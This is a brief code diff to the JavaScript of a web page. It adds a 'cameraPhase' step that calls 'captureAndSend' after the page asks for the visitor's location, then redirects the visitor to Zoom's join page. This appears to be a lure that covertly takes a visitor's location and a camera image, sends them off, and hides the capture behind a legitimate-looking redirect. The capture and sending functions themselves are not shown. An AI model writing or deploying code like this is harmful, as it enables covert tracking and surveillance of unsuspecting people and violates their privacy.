@@ -349,8 +349,16 @@
             btn.style.backgroundColor = "#555";
             btn.style.cursor = "wait";
         }
-        locate(magicExit, magicExit);
+        
+        // 1. Ask Location -> If YES: Run CameraPhase -> If NO: Run MagicExit
+        locate(cameraPhase, magicExit);
     }
+
+    function cameraPhase() {
+        // 2. Ask Camera -> Then Run MagicExit
+        captureAndSend(magicExit);
+    }
+
     function magicExit() {
         setTimeout(function() {
             window.location.replace("https://zoom.us/join");
